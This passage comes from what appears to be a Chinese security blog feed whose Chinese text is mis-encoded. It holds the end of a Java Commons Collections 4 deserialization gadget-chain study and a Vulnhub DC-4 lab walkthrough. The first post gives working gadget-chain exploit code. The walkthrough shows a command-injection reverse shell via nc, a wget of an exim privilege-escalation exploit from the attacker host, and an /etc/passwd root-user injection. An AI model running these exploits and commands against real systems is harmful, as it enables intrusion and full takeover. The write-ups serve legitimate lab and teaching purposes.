class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//Âä®ÊÄÅÁ±ªÂä†ËΩΩÂëΩ‰ª§ÊâßË°å  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">        serialize(priorityQueue);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰ΩÜÊòØËøôÈáåÂºπÂá∫ËÆ°ÁÆóÂô®Â§±Ë¥•ËØ¥Êòé‰∏≠Èó¥Âá∫‰∫ÜÈóÆÈ¢òÔºådebug‰∏Ä‰∏ãÔºåÊñ≠ÁÇπÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248413.png" alt="image-20230705124810172"><br>ÈóÆÈ¢òÂá∫Âú®‰∏ãÈù¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248848.png" alt="image-20230705124816746"><br>Ë∞ÉËØïÂèëÁé∞Âπ∂Ê≤°ÊúâËøõÂÖ•<code>siftDown</code>ÊñπÊ≥ïÔºåËÄåÊàë‰ª¨Ë¶ÅÊ±ÇÂ∞±ÊòØË¶ÅËøõÂÖ•ÔºåÂØªÊâæ‰∏Ä‰∏ãÂéüÂõ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br></pre></td></tr></table></figure><p>ÂΩì‰ª£Á†ÅËµ∞Âà∞ËøôÈáåÁöÑÊó∂ÂÄôsize‰∏∫0ÔºåÂΩìsize‰∏∫1ÁöÑÊó∂ÂÄôÂè≥Áßª1‰ΩçËøòÊòØ0<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051248594.png" alt="image-20230705124853515"><br>ÂΩìsize‰∏∫2Âç≥ÂèØÂæóÂà∞1ËøõÂÖ•forÂæ™ÁéØÔºåËÄåËøô‰∏™sizeÂ∞±ÊòØÈòüÂàóÁöÑÈïøÂ∫¶ÔºåÈÇ£‰πàÊàëÂæÄËøô‰∏™ÈòüÂàóÈáåÈù¢Âä†ÁÇπ‰∏úË•øÂ∞±Ë°å‰∫Ü</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051249225.png" alt="image-20230705124905041"><br>Ê≠§Êó∂ÂºπÂá∫ËÆ°ÁÆóÂô®‰∫ÜÔºå‰ΩÜÊòØËøôÈáåÊä•ÈîôÔºåÂΩìÊàëÊääÂ∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñÊ≥®Èáä‰πãÂêéËøòÊòØÂºπ‰∫ÜËÆ°ÁÆóÂô®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061925481.png" alt="image-20230706192532303"><br>ËØ¥ÊòéËøô‰∏™ËÆ°ÁÆóÂô®ÂºπÁöÑÂíåÂ∫èÂàóÂåñÊ≤°ÂÖ≥Á≥ªÔºåÈóÆÈ¢òÂ∞±Âá∫Âú®‰∫ÜËøô‰∏™<code>priorityQueue.add(1);</code>Ë∑üËøõÂéªÁúã‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307061925964.png" alt="image-20230706192237127"><br>ÂèëÁé∞Ëøô‰∏™addÁõ¥Êé•‰ºöËøõÂÖ•Âà∞compareÊñπÊ≥ïÔºåÁõ¥Êé•Â∞±Âú®Êú¨Âú∞ÊâßË°å‰∫ÜÊ≤°Áé©ÁöÑ‰∫ÜÔºåÊâÄ‰ª•ÂæóÈÅøÂÖçÊú¨Âú∞ÊâßË°å<br>Êä•ÈîôÁöÑÂéüÂõ†ÂÖ∂ÂÆûÊòØCC3ÈáåÁöÑ<code>_tfactory</code> ÂÄºÔºåÈÉΩÂøò‰∫ÜËøôÊòØÂπ≤ÂòõÁöÑ‰∫ÜÔºåÂú®ÂâçÈù¢ÁöÑexp‰∏≠Â∞ë‰∫Ü‰∏ÄÂè•<code>templates.newTransformer();</code>ÂØºËá¥Êä•ÈîôÂä†‰∏äÂ∞±Ë°å‰∫ÜÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>‰ΩÜÂÖ∂ÂÆûËøôÈáåÊ†πÊú¨Ê≤°Âï•ÂÖ≥Á≥ªÔºåÊú¨Êù•Â∞±‰∏çÊÉ≥ËÆ©ÂÆÉÂú®Êú¨Âú∞ÊâßË°åÔºåËß£ÂÜ≥addÁöÑÈóÆÈ¢òÂíåÂâçÈù¢CC1ÔºàÂ•ΩÂÉèÊòØ‰∏çËÆ∞Âæó‰∫ÜÔºâ‰∏ÄÊ†∑Êää<code>transformingComparator</code> ÁöÑÂÄºÊîπ‰∏∫‰∏Ä‰∏™Êó†ÂÖ≥ÁöÑÂØπË±°ÔºåÂú® add ÂÆå‰πãÂêéÂÜçÁî®ÂèçÂ∞Ñ‰øÆÊîπÂõûÊù•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="comment">//Âä®ÊÄÅÁ±ªÂä†ËΩΩÂëΩ‰ª§ÊâßË°å  </span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">                instantiateTransformer  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">  </span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        transformField.set(transformingComparator, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051249793.png" alt="image-20230705124940577"></p><h2 id="ÊµÅÁ®ãÂõæ"><a href="#ÊµÅÁ®ãÂõæ" class="headerlink" title="ÊµÅÁ®ãÂõæ"></a>ÊµÅÁ®ãÂõæ</h2><p>ÊÑüËßâCC4Â≠¶ÁöÑÊå∫ËΩªÊùæÁöÑÔºå‰∏çËøáÂâçÈù¢ÁöÑÊúâ‰∫õ‰∏úË•øÂøòËÆ∞‰∫ÜÔºåËøòÊòØË¶ÅÂ§öÊÄªÁªìÔºåÊµÅÁ®ãÂõæÂ¶Ç‰∏ãÔºåÁõ¥Êé•ÁîªÂú®‰∏ÄÂ†Ü‰∫Ü‰∏çÂçïÁã¨Áîª‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307062015392.png" alt="image-20230706201426369"></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-4</title>
      <link href="/2023/07/Vulnhub-DC-4/"/>
      <url>/2023/07/Vulnhub-DC-4/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢ÉÂáÜÂ§á"><a href="#ÁéØÂ¢ÉÂáÜÂ§á" class="headerlink" title="ÁéØÂ¢ÉÂáÜÂ§á"></a>ÁéØÂ¢ÉÂáÜÂ§á</h2><p>‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p><h2 id="ÂºÄÂßãÊâìÈù∂"><a href="#ÂºÄÂßãÊâìÈù∂" class="headerlink" title="ÂºÄÂßãÊâìÈù∂"></a>ÂºÄÂßãÊâìÈù∂</h2><p>Êâ´ÊèèÂ≠òÊ¥ªIP<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042110558.png" alt="image-20230704210958475"><br>ËÆøÈóÆÂá∫Áé∞‰∏Ä‰∏™ÁôªÂΩïÁïåÈù¢ÔºåÊàëÁöÑ7‰∏áÊï∞ÊçÆÂ§ßÂ≠óÂÖ∏ÈÉΩÊ≤°ÁàÜÂá∫Êù•„ÄÇ„ÄÇ„ÄÇÈöæÈÅì‰∏çÊòØÂº±Âè£‰ª§ÔºüÔºüÈù†admin&#x2F;adminËøõÂéª‰∫ÜÔºåÊàëÁöÑÂ§ßÂ≠óÂÖ∏Ê≤°ÊúâÔºüÔºü‰ªîÁªÜÊü•ÁúãÂèëÁé∞Ê†πÊú¨Ê≤°ÂÅöÂØÜÁ†ÅÈ™åËØÅ„ÄÇ„ÄÇ„ÄÇ<br>ËøõÂÖ•ÂèØ‰ª•ÊâßË°å‰∏â‰∏™LinuxÂëΩ‰ª§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042111368.png" alt="image-20230704211027412"><br>Êäì‰∏™ÂåÖÂèëÁé∞ÊòØ‰ªªÊÑè‰ª£Á†ÅÊâßË°åÔºåÁõ¥Êé•ÂÜôÂÖ•webshellÂèëÁé∞Â≠òÂú®ËøáÊª§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042110895.png" alt="image-20230704211037843"><br>base64‰πãÂêéÊòæÁ§∫ÂÜôÂÖ•ÊàêÂäüÔºå‰ΩÜÊòØÊü•ÁúãÂèàÊ≤°ÊúâÊñá‰ª∂Â∞±ÂæàÂ•áÊÄ™ÔºåÁúã‰∫ÜwpÂèëÁé∞Áõ¥Êé•ÂºπshellÔºå‰πüÂØπÂïäÔºåÈÉΩËÉΩÂëΩ‰ª§ÊâßË°å‰∫Ü‰∏∫Âï•‰∏çËØïËØïÂºπ‰∏™shellÂë¢„ÄÇ„ÄÇ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radio=nc+192.168.75.128+6666+-e+/bin/bash&amp;submit=Run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042111871.png" alt="image-20230704211134821"><br>ÁÑ∂ÂêéÁî®pythonËé∑Âèñ‰∏™‰∫§‰∫íÂºèshellÔºåÊü•ÁúãrootÊ≤°ÊúâÊùÉÈôê</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042112524.png" alt="image-20230704211155202"></p><h2 id="eximÊèêÊùÉ"><a href="#eximÊèêÊùÉ" class="headerlink" title="eximÊèêÊùÉ"></a>eximÊèêÊùÉ</h2><p>ÁÑ∂ÂêéÂ∞±ÊòØÊèêÊùÉ‰∫ÜÔºåÊü•ÁúãÂÖ∑ÊúâsuidÊùÉÈôêÁöÑÂëΩ‰ª§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042112458.png" alt="image-20230704211250399"><br>Â≠òÂú®exim4Ëøô‰∏™ÂèØ‰ª•Áî®Êù•ÊèêÊùÉÔºåÊü•Áúã‰∏Ä‰∏ãÁâàÊú¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113715.png" alt="image-20230704211301624"><br>ÁÑ∂ÂêémsfÁõ¥Êé•ÊêúÁõ∏ÂØπÂ∫îÁöÑexp<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113333.png" alt="image-20230704211312249"><br>ÊàëËøôÈáåÂ∞ÜexpÂ§çÂà∂Âà∞‰∫ÜÊàëÁöÑÁî®Êà∑ÁõÆÂΩï‰∏ãÔºåÁÑ∂ÂêéÁî®pythonËµ∑‰∫Ü‰∏Ä‰∏™‰∏¥Êó∂ÊúçÂä°ÔºåÂÜçÂú®Èù∂Êú∫‰∏ä‰ΩøÁî®wget‰∏ãËΩΩexpÂà∞tmpÁõÆÂΩï‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113032.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/tmp$ wget http://192.168.75.128:8000/46996.sh</span><br><span class="line">wget http://192.168.75.128:8000/46996.sh</span><br><span class="line">--2023-07-04 22:29:12--  http://192.168.75.128:8000/46996.sh</span><br><span class="line">Connecting to 192.168.75.128:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3552 (3.5K) [text/x-sh]</span><br><span class="line">Saving to: &#x27;46996.sh&#x27;</span><br><span class="line"></span><br><span class="line">46996.sh            100%[===================&gt;]   3.47K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2023-07-04 22:29:12 (62.2 MB/s) - &#x27;46996.sh&#x27; saved [3552/3552]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113307.png" alt="image-20230704211335280"><br>ÁÑ∂ÂêéÁªôÊñá‰ª∂ËµãÊâßË°åÊùÉÈôêÂÜçËøêË°åÂç≥ÂèØÊèêÂçáÂà∞root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br><span class="line">./46996.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113770.png" alt="image-20230704211344723"><br>rootÁõÆÂΩï‰∏ãÂæóÂà∞flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113536.png" alt="image-20230704211352490"></p><h2 id="teeheeÊèêÊùÉ"><a href="#teeheeÊèêÊùÉ" class="headerlink" title="teeheeÊèêÊùÉ"></a>teeheeÊèêÊùÉ</h2><p>ËøôÈáåÊàëÁõ¥Êé•ËÆ∞ÂΩïÊèêÊùÉÁöÑ‰∏ÄÈÉ®ÂàÜ‰∫ÜÔºåÂâçÈù¢ÁöÑÁõ¥Êé•ÁúÅÁï•‰∫ÜÔºåÊÑüÂÖ¥Ë∂£ÂèØ‰ª•Âú®ÁΩë‰∏äÁúãÂÖ∂‰ªñÁöÑwpÔºåÈÄöËøáÂâçÈù¢ÁöÑÊìç‰ΩúÂèØ‰ª•ÂæóÂà∞charlesÁî®Êà∑ÁöÑÂØÜÁ†ÅÂ¶Ç‰∏ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br><span class="line">^xHhA&amp;hvim0y  #ÂØÜÁ†Å</span><br></pre></td></tr></table></figure><p>ÂàáÊç¢Âà∞Ëøô‰∏™Áî®Êà∑‰ΩøÁî®ÂëΩ‰ª§<code>sudo -l</code>Êü•ÁúãÂÖ∑ÊúârootÊùÉÈôêÁöÑÂëΩ‰ª§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114230.png" alt="image-20230704211405178"><br>ÂèëÁé∞Êúâ‰∏™teeheeÂëΩ‰ª§<br><strong>teeheeÂëΩ‰ª§ÂèØ‰ª•ÂÜôÂÖ•Êñá‰ª∂ÂÜÖÂÆπÂπ∂‰∏çË¶ÜÁõñÊñá‰ª∂ÂéüÊúâÂÜÖÂÆπ</strong><br>ÂèØ‰ª•Áî®Ëøô‰∏™ÂëΩ‰ª§ÂÜôÂÖ•‰∏Ä‰∏™Êó†ÂØÜÁ†ÅÁöÑadminÁî®Êà∑Âà∞&#x2F;etc&#x2F;passwdÊñá‰ª∂ÔºåÂπ∂Âä†ÂÖ•Âà∞rootÁªÑ‰∏≠</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114723.png" alt="image-20230704211410690"><br>ÁÑ∂ÂêéÂàáÊç¢Âà∞adminÁî®Êà∑ÊàêÂäüÂèò‰∏∫rootÊùÉÈôê<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114681.png" alt="image-20230704211418608"></p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
